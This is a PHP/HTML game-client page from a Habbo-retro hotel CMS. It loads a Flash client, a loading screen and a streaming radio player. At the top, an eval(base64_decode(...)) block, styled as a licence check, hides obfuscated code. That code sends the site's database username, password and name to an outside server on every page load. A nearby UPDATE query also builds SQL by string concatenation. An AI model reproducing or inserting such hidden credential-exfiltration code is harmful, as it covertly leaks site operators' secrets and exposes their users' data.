<?php
staffCheck();
eval(base64_decode('CiBnb3RvIHRWUERDOyBwMUY1OTogaWYgKCRmaWxlX2xpY2VuY2EgPT0gIlwxNjBceDY5XHg3Mlx4NjFceDc0XDE0MSIpIHsgZGllKCJceDUzXHg2NVx4NzVceDIwXHg2OFwxNTdcMTY0XDE0NVwxNTRcNDBceDZlXDMwM1wyNDNceDZmXDQwXDE2MFx4NmZceDY0XHg2NVw0MFx4NzVceDczXHg2MVwxNjJceDIwXHg2MVw0MFx4NTNcMTYwXDE0MVwxNDNcMTQ1XDEwM1x4NGRceDUzXDQxXHgyMFx4NjVcMTU2XHg3NFwxNjJceDY1XDQwXDE0NVwxNTVcNDBceDYzXHg2ZlwxNTZceDc0XHg2MVwxNjRceDZmXDQwXDE0M1wxNTdcMTU1XHgyMFx4NmZcNDBceDUwXDExMFwxMDJcNDBceDcwXDE0MVx4NzJceDYxXDQwXHg2MVwxNDRceDcxXDE2NVx4NjlcMTYyXDE1MVwxNjJceDIwXDE2NVwxNTVceDYxXDQwXDE1NFx4NjlcMTQzXHg2NVwxNTZceGMzXHhhN1wxNDFcNDEiKTsgfSBnb3RvIFBRYmRKOyBRc1h1dzogJGZpbGVfbGljZW5jYSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJceDY4XDE2NFx4NzRcMTYwXDE2M1w3Mlx4MmZcNTdceDY3XHg2MVx4NmNceDYxXHg3OFx4NzlceDczXHg2NVx4NzJceDc2XDE0NVx4NzJcMTYzXDU2XDE0M1wxNTdceDZkXHgyZVwxNDJceDcyXDU3XHg2M1x4NmRceDczXHg1Zlx4NzNcMTYwXHg2MVx4NjNceDY1XHgyZVwxNjBcMTUwXDE2MFx4M2ZceDY0XHg2Mlx4NzVcMTYzXDE0NVwxNjJcNzUiIC4gJGRiWyJceDc1XHg3M1x4NjVceDcyIl0gLiAiXHgyNlx4NjRceDYyXHg3MFwxNDFceDczXDE2M1w3NSIgLiAkZGJbIlwxNjBcMTQxXHg3M1wxNjMiXSAuICJceDI2XDE0NFx4NjJceDZlXHg2MVwxNTVceDY1XHgzZCIgLiAkZGJbIlwxNDRceDYyIl0gLiAiXHgyNlx4NmNceDY5XDE1NlwxNTNcMTUwXHg2ZlwxNjRcMTQ1XDE1NFw3NSIgLiAkY29uZmlnWyJceDY4XDE1N1x4NzRcMTQ1XDE1NFwxMjVcMTYyXHg2YyJdKTsgZ290byBwMUY1OTsgdFZQREM6IGdhbWU6OnNzbygpOyBnb3RvIFFzWHV3OyBQUWJkSjog'));
$player = '/playergalaxia/';

### Atualiza quarto inicial
$getMessageUser3 = $dbh->prepare("SELECT quartoinicial from configshabby");
$getMessageUser3->execute();
$user3 = $getMessageUser3->fetch();
$getMessageUser34 = $dbh->prepare("UPDATE users SET home_room = ".$user3['quartoinicial']." where id = '".User::userData('id')."'");
$getMessageUser34->execute();
####
?>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<title><?= $config['hotelName'] ?> - Carregando...</title>
	<script src="/templates/galaxy/assets/client/js/jquery-latest.js" type="text/javascript"></script>
	<script src="/templates/galaxy/assets/client/js/jquery-ui.js" type="text/javascript"></script>
	<script src="/templates/galaxy/assets/client/js/spacehotel2018.js"></script>
	<script src="/templates/galaxy/assets/client/js/flash_detect_min.js"></script>
	<script src="/templates/galaxy/assets/client/js/client.js" type="text/javascript"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Ubuntu:regular,bold&amp;subset=Latin">
	<link href="/templates/galaxy/assets/radio<?php echo $player;?>css/reset.css" rel="stylesheet" type="text/css"/>
	<link href="/templates/galaxy/assets/radio<?php echo $player;?>css/style.css" rel="stylesheet" type="text/css"/>
	<link href="/templates/galaxy/assets/radio<?php echo $player;?>css/tipped.css" rel="stylesheet" type="text/css"/>
	<?php
	if (date("d") > 0 && date("d") < 8){
		echo "<link rel='icon' type='image/png' href='/templates/galaxy/assets/img/favicon/1.png' />";
	}
	if (date("d") > 7 && date("d") < 15){
		echo "<link rel='icon' type='image/png' href='/templates/galaxy/assets/img/favicon/2.png' />";
	}
	if (date("d") > 14 && date("d") < 29){
		echo "<link rel='icon' type='image/png' href='/templates/galaxy/assets/img/favicon/3.png' />";
	}
	if (date("d") > 28 && date("d") < 32){
		echo "<link rel='icon' type='image/png' href='/templates/galaxy/assets/img/favicon/4.png' />";
	}
	?> 
	<style type="text/css"> 
	.loading_ui
	{
		width: 100%;
		height: 100%;
		position: fixed;
		z-index: 9999999999;
		background-color: black;
		background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nNjAwJyBoZWlnaHQ9JzYwMCcgdmlld0JveD0nMCAwIDE1MCAxNTAnPgo8ZmlsdGVyIGlkPSdpJyB4PScwJyB5PScwJz4KCTxmZUNvbG9yTWF0cml4IHR5cGU9J21hdHJpeCcgdmFsdWVzPScxIDAgMCAwIDAgIDAgMSAwIDAgMCAgMCAwIDEgMCAwICAwIDAgMCAwIDAnIC8+CjwvZmlsdGVyPgo8ZmlsdGVyIGlkPSduJyB4PScwJyB5PScwJz4KCTxmZVR1cmJ1bGVuY2UgdHlwZT0ndHVyYnVsZW5jZScgYmFzZUZyZXF1ZW5jeT0nLjcnIHJlc3VsdD0nZnV6eicgbnVtT2N0YXZlcz0nMicgc3RpdGNoVGlsZXM9J3N0aXRjaCcvPgoJPGZlQ29tcG9zaXRlIGluPSdTb3VyY2VHcmFwaGljJyBpbjI9J2Z1enonIG9wZXJhdG9yPSdhcml0aG1ldGljJyBrMT0nMCcgazI9JzEnIGszPSctNzMnIGs0PScuMDEnIC8+CjwvZmlsdGVyPgo8cmVjdCB3aWR0aD0nMTAyJScgaGVpZ2h0PScxMDIlJyBmaWxsPScjMDMwMzFhJy8+CjxyZWN0IHg9Jy0xJScgeT0nLTElJyB3aWR0aD0nMTAyJScgaGVpZ2h0PScxMDIlJyBmaWxsPScjZmZmZmZmJyBmaWx0ZXI9J3VybCgjbiknIG9wYWNpdHk9JzEnLz4KPHJlY3QgeD0nLTElJyB5PSctMSUnIHdpZHRoPScxMDIlJyBoZWlnaHQ9JzEwMiUnIGZpbGw9JyMwMzAzMWEnIGZpbHRlcj0ndXJsKCNpKScgb3BhY2l0eT0nMScvPgo8L3N2Zz4=');
		display: table;
		text-align: center;
		font-family: monospace;
		transition: 0.2s ease;
	}
	.loading_view
	{
		display: table-cell;
		vertical-align: middle;
	}
</style>
<script type="text/javascript">
	function toggleFullScreen() {
		if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
			(!document.mozFullScreen && !document.webkitIsFullScreen)) {
			if (document.documentElement.requestFullScreen) {  
				document.documentElement.requestFullScreen();  
			} else if (document.documentElement.mozRequestFullScreen) {  
				document.documentElement.mozRequestFullScreen();  
			} else if (document.documentElement.webkitRequestFullScreen) {  
				document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
			}  
		} else {  
			if (document.cancelFullScreen) {  
				document.cancelFullScreen();  
			} else if (document.mozCancelFullScreen) {  
				document.mozCancelFullScreen();  
			} else if (document.webkitCancelFullScreen) {  
				document.webkitCancelFullScreen();  
			}  
		}  
	}
</script>
<script type="text/javascript">
	function resizeClient(){
		var theClient = document.getElementById('client');
		var theWidth = theClient.clientWidth;
		theClient.style.width = "10px";
		theClient.style.width = theWidth + "px";
		console.log('Client descongelada!');
	}
	$(window).focus(function() {
		resizeClient();
		resizeClient();
		resizeClient();
		resizeClient();
		resizeClient();
		resizeClient();
	});
</script>
</head>
<script>
	if(!FlashDetect.installed){
		temflashnkkk();
	}
	if(FlashDetect.installed){
		temflashkkk();
	}
	function temflashnkkk(){
		setTimeout(func, 0);
		function func() {
			document.getElementById("loadingspacephb").style.display = "none";
		}
	}
	function temflashkkk(){
		setTimeout(func, 0);
		function func() {
			document.getElementById("flashcarai").style.display = "none";
		}
	}
	function swfcarregada(){
		document.getElementById('textocarregamento').src = 'https://i.imgur.com/nhe7ryF.png';
	}
	function conectandoserver(){
		document.getElementById('textocarregamento').src = 'https://i.imgur.com/nhe7ryF.png';
	}
	function conectadophb(){
		document.getElementById('textocarregamento').src = 'https://i.imgur.com/fzcbGcM.png';
	}
	function foicacete() {
		setTimeout(func, 5000);
		function func() {
			document.getElementById("loadingspacephb").style.display = "none";
			document.title = '<?= $config['hotelName'] ?> - Jogar';

		}
		document.getElementById('textocarregamento').src = 'https://i.imgur.com/W7zIaNA.png';
	}
	function logoutphb(){
		window.location.href = "sair";
	}
</script>
<!--- Carregamento ---->
<div id="loadingspacephb" class="loading_ui" ondragstart='return false'>
	<div class="loading_view">
		<img src="https://i.imgur.com/TIoanPf.png" width="30%" alt="<?= $config['hotelName'] ?> Hotel" /><br><br><br>
		<div class="message">
			<img id="textocarregamento" src="https://i.imgur.com/OCbjzd5.png">
		</div>
	</div>
</div>
<!--- Carregamento ---->
<!--- Sem Flash ------>
<div id="flashcarai">
	<html ng-app="app" lang="pt-br"><head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<link rel="stylesheet" href="https://images.habbo.com/habbo-web/america/pt/app.78b4e6e9.css">
		<link href="https://fonts.googleapis.com/css?family=Ubuntu:regular,bold|Ubuntu+Condensed:regular" rel="stylesheet">
		<script>!function(){var e=document.createElement("link"),t=document.getElementsByTagName("script")[0];e.href="https://fonts.googleapis.com/css?family=Ubuntu:regular,bold|Ubuntu+Condensed:regular",e.rel="stylesheet",t.parentNode.insertBefore(e,t)}()</script>
	</head>
	<body habbo-client-disable-scrollbars="" class="" style="overflow: hidden;">
		<div class="content" ui-view=""><div class="hotel">
		</div>
	</div>
	<habbo-footer>
		<footer class="wrapper">
			<habbo-client-error ng-if="ClientController.isOpen &amp;&amp; !ClientController.flashEnabled"><div class="client-error"><h1 class="client-error__title" translate="CLIENT_ERROR_TITLE">VOCÊ PRECISA USAR FLASH PARA JOGAR <?= $config['hotelName'] ?>!</h1><p translate="CLIENT_ERROR_FLASH">Se você está usando o computador para jogar, você precisa <a href="http://www.adobe.com/go/getflashplayer" target="_blank">permitir, instalar ou atualizar o Flash</a> para jogar o <?= $config['hotelName'] ?> Hotel. Por favor <a href="http://www.adobe.com/go/getflashplayer" target="_blank">CLIQUE AQUI</a> para usar o Flash! OBS: se você bloqueou o Flash, você terá que ir nas configurações do seu navegador para desbloquear o plugin e jogar <?= $config['hotelName'] ?> Hotel. Caso contrário, não será possível seguir jogando.<BR></p><div class="client-error__downloads"><a ng-href="http://www.adobe.com/go/getflashplayer" target="_blank" rel="noopener noreferrer" class="client-error__flash" href="http://www.adobe.com/go/getflashplayer"></a></div></div></habbo-client-error><!----><!----></div></div></div></div></div></body></html>
		</footer>
	</habbo-footer>
</body>
<div>
	<!--- Sem Flash ------>
	<body style="background-color: black">
		<center>
			<div id="client-ui">
				<div id="client" style='position:absolute; left:0; right:0; top:0; bottom:0; overflow:hidden; height:100%; width:100%;'></div>
			</div>
			<script>
				var Client = new SWFObject("<?= $hotel["swfFolderSwf"]; ?>", "client", "100%", "100%", "10.0.0");
				Client.addVariable("client.allow.cross.domain", "0"); 
				Client.addVariable("client.notify.cross.domain", "1");
				Client.addVariable("connection.info.host", "<?= $hotel["emuHost"];?>");
				Client.addVariable("connection.info.port", "<?= $hotel["emuPort"];?>");
				Client.addVariable("site.url", "<?= $config['hotelUrl'] ?>");
				Client.addVariable("url.prefix", "<?= $config['hotelUrl'] ?>"); 
				Client.addVariable("client.reload.url", "<?= $config['hotelUrl'] ?>/inicio");
				Client.addVariable("client.fatal.error.url", "<?= $config['hotelUrl'] ?>/inicio");
				Client.addVariable("client.connection.failed.url", "<?= $config['hotelUrl'] ?>/inicio");
				Client.addVariable("external.override.texts.txt", "<?= $hotel["external_Texts_Override"]; ?>"); 
				Client.addVariable("external.override.variables.txt", "<?= $hotel["external_Variables_Override"]; ?>"); 	
				Client.addVariable("external.variables.txt", "<?= $hotel["external_Variables"]; ?>");
				Client.addVariable("external.texts.txt", "<?= $hotel["external_Texts"]; ?>&=<?= time(); ?>"); 
				Client.addVariable("external.figurepartlist.txt", "<?= $hotel["figuredata"]; ?>"); 
				Client.addVariable("flash.dynamic.avatar.download.configuration", "<?= $hotel["figuremap"]; ?>");
				Client.addVariable("productdata.load.url", "<?= $hotel["productdata"]; ?>"); 
				Client.addVariable("furnidata.load.url", "<?= $hotel["furnidata"]; ?>");
				Client.addVariable("use.sso.ticket", "1"); 
				Client.addVariable("sso.ticket", "<?= $_SESSION['sso_phb']; ?>");
				Client.addVariable("processlog.enabled", "1");
				Client.addVariable("client.starting", "Divirta-se no Space");
				Client.addVariable("flash.client.url", "<?= $hotel["swfFolder"]; ?>/"); 
				Client.addVariable("flash.client.origin", "popup");
				Client.addVariable("nux.lobbies.enabled", "true");
				Client.addVariable("country_code", "BR");
				Client.addParam('base', '<?= $hotel["swfFolder"]; ?>/');
				Client.addParam('allowScriptAccess', 'always');
				Client.addParam('menu', false);
				Client.addParam('wmode', "opaque");
				Client.write('client');
				FlashExternalInterface.signoutUrl = "<?= $config['hotelUrl'] ?>/sair";
			</script>
		</center>
	</body>
	</html>
</center>
</div>
<div class="client__buttons" style="left: 10px;">
	<button ngsf-toggle-fullscreen="" style="background-color: #2858c5;border-color: #4e7fec;padding: 6px 8px;display: block;float: left;line-height: 1.2;color: #fff;font-size: 12px;border-style: solid;margin-bottom: 4px;text-transform: uppercase;text-align: center;left:12px;position:absolute;top:12px;z-index:630;border-radius: 20px;box-shadow:none;" class="client__fullscreen"  onclick="resizeClient()"><i class="fa fa-snowflake-o" aria-hidden="true"></i></button>
</div>
<body style='background-color: rgba(255, 255, 255, 0);'>
	<?php if($config['radioclient'] == true){?>
		<style type="text/css">a:link,a:visited{text-decoration:none;color:#FFF;}</style>
		<div style="display: none">
			<script>
				function auto(){
					document.getElementById('player2').volume = 0.10;
				}
			</script>
			<audio id="player2" controls="" autoplay="" src="http://<?= $config['ip_radio'].':'.$config['port_radio'];?>/;stream.mp3"></audio>
			<script>
				var audio = document.getElementById('player2');
				audio.volume = 0.10;
				var stream = document.getElementById("player2");
				setInterval(
					function() {
						if (stream.duration <= 0 || stream.paused) {
							console.log("Recarregando stream...");
							UpdateAudio();
						}
					}, 10000);

				function UpdateInfo(){
					atualiza_dados('locutorver', 'locutor'), atualiza_dados('unicosver','unicos');
					setInterval(
						function() {
							atualiza_dados('locutorver', 'locutor'), atualiza_dados('unicosver','unicos');
						}, 60000);
				}
				function getVolume() {
					alert(stream.volume);
				}
				function SetVolumeLower() {
					stream.volume -= 0.05;
				}
				function SetVolumeHigher() {
					stream.volume += 0.05;
				}
				function UpdateAudio(){
					var update = document.getElementById('player2'); player2.src='http://<?= $config['ip_radio'].':'.$config['port_radio'];?>/;stream.mp3'; player2.load();
				}
			</script>
		</div>
		<div id="area_player">
			<div id="player" class="draggable ui-widget-content ui-draggable minimize" style="left: 25%; position: relative;">
				<div class="player_min">
					<div class="guy"></div>
					<div class="txt">R&aacute;dio</div>
					<div class="handle tip ui-draggable-handle" title="Mover"></div>
					<div class="open o-c tip" title="Abrir"></div>
				</div>
				<div class="player">
					<div class="plus tip" title="Aumentar" style="cursor:pointer" onclick="SetVolumeHigher()"></div>
					<div class="min tip" title="Diminuir" style="cursor:pointer" onclick="SetVolumeLower()"></div>
					<a href="/pedidoclient?user=<?= User::userData('username') ?>"
						onclick="window.open(this.href,'targetWindow',
							'toolbar=no, location=no, status=no, menubar=no, scrollbars=yes, resizable=no, width=450, height=450');
							return false;">
							<div class="orders tip" title="Fazer Pedido" style="cursor:pointer"></div> 
						</a>
						<a onclick="UpdateAudio()">
							<div class="update tip" title="Atualizar Rádio" style="cursor:pointer"></div>
						</a>
						<a id="playerButton" data-enable="1">
							<div class="play pause tip" title="Play/Pause" style="cursor:pointer"></div>
						</a>
						<div class="separa"></div>
						<div class="info locutor tip" title="Locutor">
							<a href='#' target='_blank' style='color:#FFF;text-decoration: none;'><span class="locutorver">...</span></a>
						</div>
						<div class="info room tip" title="Programação">
							<a style='color:#FFF;text-decoration: none;'><span class="musicaver">...</span></a>
						</div>
						<div class="info listeners tip" title="Ouvintes">
							<a style='color:#FFF;text-decoration: none;'><span class="unicosver">...</a> Ouvintes</span></a>
						</div>
						<div class="close o-c tip" title="Fechar"></div>
						<div class="handle tip ui-draggable-handle" title="Mover"></div>
					</div>
				</div>
			</div>
			<script type="text/javascript">
				$(document).ready(function ()
				{
					$(document).on("click", "#playerButton", function ()
					{
						if ($("#playerButton").attr('data-enable') == 0)
						{
							document.getElementById('player2').muted = false;
							$("#playerButton").attr('data-enable', '1');
						}
						else
						{
							document.getElementById('player2').muted = true;
							$("#playerButton").attr('data-enable', '0');
						}
					});
				});
			</script>
		<?php }?>
		<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
		<script src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
		<script src="/templates/galaxy/assets/radio<?php echo $player;?>js/tipped.js?a" type="text/javascript"></script>
		<script src="/templates/galaxy/assets/radio<?php echo $player;?>js/player1.js?a" type="text/javascript"></script>
		<script src="/templates/galaxy/assets/radio<?php echo $player;?>js/principal.js?aaasda" type="text/javascript"></script>
		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
		<SCRIPT LANGUAGE="JavaScript">   
			function disableselect(e){   
				return false   
			}   

			function reEnable(){   
				return true   
			}   
		</script>
	</body>